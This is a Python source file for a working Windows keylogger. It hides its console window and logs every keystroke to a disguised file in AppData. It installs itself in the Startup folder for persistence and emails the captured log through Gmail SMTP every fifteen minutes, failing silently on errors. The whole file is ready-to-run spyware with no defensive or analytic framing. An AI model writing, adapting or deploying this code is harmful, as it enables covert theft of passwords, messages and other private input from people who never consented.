import os
import time
import smtplib
import threading
import getpass
from datetime import datetime
from pynput import keyboard

# ------------------------- Windows Only: Hide Console -------------------------
try:
    import win32console
    import win32gui

    def hide():
        window = win32console.GetConsoleWindow()
        win32gui.ShowWindow(window, 0)
    hide()
except:
    pass  # Skip if not on Windows

# ------------------------- Configs -------------------------
user = getpass.getuser()
log_file = f"C:\\Users\\{user}\\AppData\\Roaming\\winlog.txt"
startup_path = f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\keylogger.pyw"

email_address = "****"
email_password = "****"  # Use Gmail App Password
recipient = "****"    # You can use same email

interval = 900  # 15 minutes

# ------------------------- Keylogger Function -------------------------
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{datetime.now()} - {key.char}\n")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"{datetime.now()} - [{key}]\n")

# ------------------------- Email Log File -------------------------
def send_email():
    try:
        with open(log_file, "r") as f:
            content = f.read()

        message = f"""From: {email_address}
To: {recipient}
Subject: [Keylogger Report]

{content}
        """

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email_address, email_password)
        server.sendmail(email_address, recipient, message)
        server.quit()
    except Exception as e:
        pass  # Fail silently

# ------------------------- Schedule Email Every X Minutes -------------------------
def schedule_report():
    send_email()
    timer = threading.Timer(interval, schedule_report)
    timer.start()

# ------------------------- Add to Startup Folder -------------------------
def add_to_startup():
    if not os.path.exists(startup_path):
        try:
            import shutil
            shutil.copy(__file__, startup_path)
        except Exception as e:
            pass  # Ignore copy errors

# ------------------------- Run Everything -------------------------
def run():
    add_to_startup()
    schedule_report()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

run()
